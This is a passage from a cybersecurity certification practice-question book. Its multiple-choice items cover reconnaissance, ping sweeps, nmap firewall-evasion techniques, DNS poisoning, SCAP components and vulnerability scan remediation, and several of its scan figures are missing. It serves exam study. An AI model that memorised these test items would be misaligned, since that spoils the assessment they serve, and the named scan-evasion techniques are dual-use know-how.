+B. Accidental
+C. Structural
+D. Environmental
+
+Chapter 1  ■ Domain 1: Threat Management  59
+204. Chris has been asked to assess the technical impact of suspected reconnaissance performed 
+against his organization. He is informed that a reliable source has discovered that a third party has been performing reconnaissance by querying WHOIS data. How should Chris categorize the technical impact of this type of reconnaissance?
+A.
+ High
+B. Medium
+C. Low
+D. He cannot determine this from the information given.
+205. Frank is creating the scope worksheet for his organization’s penetration test. Which of the 
+following techniques is not typically included in a penetration test?
+A. Reverse engineering
+B. Social engineering
+C. Denial-of-service attacks
+D. Physical penetration attempts
+206. Allan needs to immediately shut down a service called Explorer.exe  on a Windows 
+server. Which of the following methods is not a viable option for him?A.
+ Use sc.
+B. Use wmic .
+C. Use secpol.msc .
+D. Use services.msc .
+207. Rick is reviewing flows of a system on his network and discovers the following flow logs. 
+What is the system doing?
+ICMP "Echo request"
+Date flow start   Duration       Proto         Src IP Addr:Port->Dst IP Addr:Port   Packets   Bytes   Flows2017-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0->10.2.2.6:8.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.2.2.6:0->10.1.1.1:0.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0->10.2.2.7:8.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.2.2.7:0->10.1.1.1:0.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0->10.2.2.8:8.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.2.2.8:0->10.1.1.1:0.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0->10.2.2.9:8.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.2.2.9:0->10.1.1.1:0.0             11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0->10.2.2.10:8.0            11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.2.2.10:0->10.1.1.1:0.0            11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0->10.2.2.6:11.0            11        924     12017-07-11        04:58:59.518   10.000 ICMP   10.2.2.11:0->10.1.1.1:0.0            11        924     1
+
+60 Chapter 1  ■ Domain 1: Threat Management
+A. A port scan
+B. A failed three-way handshake
+C. A ping sweep
+D. A traceroute
+208. Ryan’s passive reconnaissance efforts resulted in the following packet capture. Which of 
+the following statements cannot be verified based on the packet capture shown for the host with IP address 10.0.2.4?
+A. The host does not have a DNS entry.
+B. It is running a service on port 139.
+C. It is running a service on port 445.
+D. It is a Windows system.
+209. Stacey encountered a system that shows as “filtered” and “firewalled” during an nmap  
+scan. Which of the following techniques should she not consider as she is planning her next scan?
+A.
+ Packet fragmentation
+B. Spoofing the source address
+C. Using decoy scans
+D. Spoofing the destination address
+210. When Charleen attempts to visit a website, she receives a DNS response from the DNS 
+cache server that her organization relies on that points to the wrong IP address. What attack has occurred?
+A.
+ DNS brute forcing
+B. ARP spoofing
+C. DNS poisoning
+D. MAC spoofing
+211. Alex has been asked to implement network controls to ensure that users who authenticate 
+to the network are physically in the building that the network they are authenticating to serves. What technology and tool should he use to do this?
+A.
+ Geo-IP and port security
+B. GPS location and NAC
+C. GPS location and port-security
+D. Geo-IP and NAC
+
+Chapter 1  ■ Domain 1: Threat Management  61
+212. As part of a penetration testing exercise, Lauren is placed on the defending team for her 
+organization. What is this team often called?
+A. The red team
+B. The white team
+C. The blue team
+D. The yellow team
+213. Lucca wants to lock down a Cisco router, and chooses to use documentation that Cisco 
+provides. What type of documentation is this?
+A. Primary documentation
+B. OEM documentation
+C. Crowd-sourced documentation
+D. System documentation
+
+Chapter 
+2Domain 2: Vulnerability 
+Management
+ExaM obj EctiVEs co VErED in this 
+chapt Er:
+ ✓2.1 Given a scenario, implement an information security 
+vulnerability management process.
+ ■Identification of requirements
+ ■Establish scanning frequency
+ ■Configure tools to perform scans according to specification
+ ■Execute scanning
+ ■Generate reports
+ ■Remediation
+ ■Ongoing scanning and continuous monitoring
+ ✓2.2 Given a scenario, analyze the output resulting from a 
+vulnerability scan.
+ ■Analyze reports from a vulnerability scan
+ ■Validate results and correlate other data points
+ ✓2.3 Compare and contrast common vulnerabilities found 
+in the following targets within an organization.
+ ■Servers
+ ■Endpoints
+ ■Network infrastructure
+ ■Network appliances
+ ■Virtual infrastructure
+ ■Mobile devices
+ ■Interconnected networks
+ ■Virtual private networks (VPNs)
+ ■Industrial Control Systems (ICSs)
+ ■SCADA devices
+
+64 Chapter 2  ■ Domain 2: Vulnerability Management
+1. Kim is preparing to deploy a new vulnerability scanner and wants to ensure that she can 
+get the most accurate view of configuration issues on laptops belonging to traveling sales-people. Which technology will work best in this situation?
+A.
+ Agent-based scanning
+B. Server-based scanning
+C. Passive network monitoring
+D. Noncredentialed scanning
+2. Carla runs a vulnerability scan of a new appliance that engineers are planning to place on 
+her organization’s network and finds the results shown here. Of the actions listed, which would correct the highest criticality vulnerability?
+A. Block the use of TLSv1.0.
+B. Replace the expired SSL certificate.
+C. Remove the load balancer.
+D. Correct the information leakage vulnerability.
+3. In what type of attack does the adversary leverage a position on a guest operating system to gain access to hardware resources assigned to other operating systems running in the same hardware environment?
+A.
+ Buffer overflow
+B. Directory traversal
+C. VM escape
+D. Cross-site scripting
+
+Chapter 2  ■ Domain 2: Vulnerability Management  65
+4. Julie is developing a vulnerability scanning approach that will unify the diverse approaches 
+used throughout her organization’s different operating locations. She would like to ensure that everyone uses the same terminology when referring to different applications and oper-ating systems. Which SCAP component can assist Julie with this task?
+A.
+ CVE
+B. CPE
+C. CVSS
+D. OVAL
+5. Josh is responsible for the security of a network used to control systems within his organi-
+zation’s manufacturing plant. The network connects manufacturing equipment, sensors, and controllers. He runs a vulnerability scan on this network and discovers that several of the controllers are running very out-of-date firmware that introduces security issues. The manufacturer of the controllers is out of business. What action can Josh take to best reme-diate this vulnerability in an efficient manner?
+A.
+ Develop a firmware update internally and apply it to the controllers.
+B. Post on an Internet message board seeking other organizations that have developed a 
+patch.
+C. Ensure that the ICS is on an isolated network.
+D. Use an intrusion prevention system on the ICS network.
+6. Vic scanned a Windows server used in his organization and found the result shown here. The server is on an internal network with access limited to IT staff and is not part of a domain. How urgently should Vic remediate this vulnerability?
+A. Vic should drop everything and remediate this vulnerability immediately.
+B. While Vic does not need to drop everything, this vulnerability requires urgent atten-tion and should be addressed quickly.
+C.
+ This is a moderate vulnerability that can be scheduled for remediation at a convenient time.
+D.
+ This vulnerability is informational in nature and may be left in place.
+
+66 Chapter 2  ■ Domain 2: Vulnerability Management
+7. Gina would like to leverage the Security Content Automation Protocol (SCAP) in her 
+ organization to bring a standard approach to their vulnerability management efforts.  
+What SCAP component can Gina use to provide a common language for describing  vulnerabilities?
+A.
+ XCCDF
+B. CVE
+C. CPE
+D. CCE
+8. Rob’s manager recently asked him for an overview of any critical security issues that exist 
+on his network. He looks at the reporting console of his vulnerability scanner and sees the options shown here. Which of the following report types would be his best likely starting point?
+A. Technical Report
+B. High Severity Report
+C. Qualys Patch Report
+D. Unknown Device Report
+9. Wendy is the security administrator for a membership association that is planning to launch an online store. As part of this launch, she will become responsible for ensuring that the website and associated systems are compliant with all relevant standards. What regulatory regime specifically covers credit card information?
+A.
+ PCI DSS
+B. FERPA
+C. HIPAA
+D. SOX
+10. During a port scan of a server, Miguel discovered that the following ports are open on the 
+internal network:
+ ■TCP port 25
+ ■TCP port 80
+
+Chapter 2  ■ Domain 2: Vulnerability Management  67
+ ■TCP port 110
+ ■TCP port 443
+ ■TCP port 1433
+ ■TCP port 3389
+The scan results provide evidence that a variety of services are running on this server. 
+Which one of the following services is not  indicated by the scan results?
+A. Web
+B. Database
+C. SSH
+D. RDP
+11. Beth is a software developer and she receives a report from her company’s cybersecurity team that a vulnerability scan detected a SQL injection vulnerability in one of her appli-cations. She examines her code and makes a modification in a test environment that she believes corrects the issue. What should she do next?
+A.
+ Deploy the code to production immediately to resolve the vulnerability.
+B. Request a scan of the test environment to confirm that the issue is corrected.
+C. Mark the vulnerability as resolved and close the ticket.
+D. Hire a consultant to perform a penetration test to confirm that the vulnerability is resolved.
+12. George recently ran a port scan on a network device used by his organization. Which one 
+of the following open ports represents the most significant possible security vulnerability?
+A. 22
+B. 23
+C. 161
+D. 443
+Questions 13 through 15 refer to the following scenario:
+Harold runs a vulnerability scan of a server that he is planning to move into production 
+and finds the vulnerability shown here.
+
+
+68 Chapter 2  ■ Domain 2: Vulnerability Management
+13. What operating system is most likely running on the server in this vulnerability scan 
+report?
+A. macOS
+B. Windows
+C. CentOS
+D. RHEL
+14. Harold is preparing to correct the vulnerability. What service should he inspect to identify 
+the issue?
+A. SSH
+B. HTTPS
+C. RDP
+D. SFTP
+15. Harold would like to secure the service affected by this vulnerability. Which one of the 
+following protocols/versions would be an acceptable way to resolve the issue?
+A. SSL v2.0
+B. SSL v3.0
+C. TLS v1.0
+D. None of the above
+16. Seth found the vulnerability shown here in one of the systems on his network. What com-
+ponent requires a patch to correct this issue?
+A. Operating system
+B. VPN concentrator
+
+
+[Note: PDF has 478 pages, only first 100 pages extracted]
